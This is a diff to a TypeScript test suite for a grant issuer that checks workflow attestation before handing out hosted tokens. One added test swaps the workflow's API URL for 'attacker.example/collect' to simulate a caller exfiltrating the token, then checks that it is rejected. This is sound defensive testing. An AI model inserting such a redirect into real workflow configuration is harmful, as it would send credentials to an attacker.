@@ -47,6 +47,36 @@ describe("HostedCodexGrantIssuer", () => {
     expect(fixture.replayNonces.tryConsumeNonce).toHaveBeenCalledOnce();
   });
 
+  it("rejects the r44 same-repository PR caller that exfiltrates the hosted token", async () => {
+    const exfiltratingCaller = workflow.replace(
+      'api_url: "https://api.reviewrouter.dev"',
+      'api_url: "https://attacker.example/collect"',
+    );
+    const fixture = createFixture({
+      workflowContents: exfiltratingCaller,
+      workflowSourceBlobSha: "9".repeat(40),
+    });
+
+    await expect(fixture.issuer.issue(request())).rejects.toThrow(
+      "hosted_workflow_attestation_blob_mismatch",
+    );
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
+    expect(fixture.commentTokens.issueCommentToken).not.toHaveBeenCalled();
+  });
+
+  it("rejects any caller byte mismatch even if blob evidence repeats the attested blob", async () => {
+    const fixture = createFixture({
+      workflowContents: `${workflow}# untrusted caller byte\n`,
+    });
+
+    await expect(fixture.issuer.issue(request())).rejects.toThrow(
+      "hosted_workflow_attestation_digest_mismatch",
+    );
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+    expect(fixture.commentTokens.issueCommentToken).not.toHaveBeenCalled();
+  });
+
   it("issues from server-derived exact authority and persists separate capabilities", async () => {
     const fixture = createFixture();
 
@@ -123,6 +153,7 @@ describe("HostedCodexGrantIssuer", () => {
       { workflow_ref: `acme/private-repo/${workflowPath}@refs/heads/main` },
     ],
     ["mismatched caller SHA", { workflow_sha: "b".repeat(40) }],
+    ["uppercase caller SHA", { workflow_sha: "E".repeat(40) }],
     ["missing caller SHA", { workflow_sha: undefined }],
     [
       "mismatched caller repository",
@@ -242,7 +273,7 @@ function createFixture(
       bindingRevision: 7,
     },
     workflowPath,
-    workflowSourceCommitSha: commitSha,
+    workflowSourceCommitSha: reviewHeadSha,
     workflowSourceBlobSha: "c".repeat(40),
     workflowContents: workflow,
     reviewRequestId: "review-request-1",
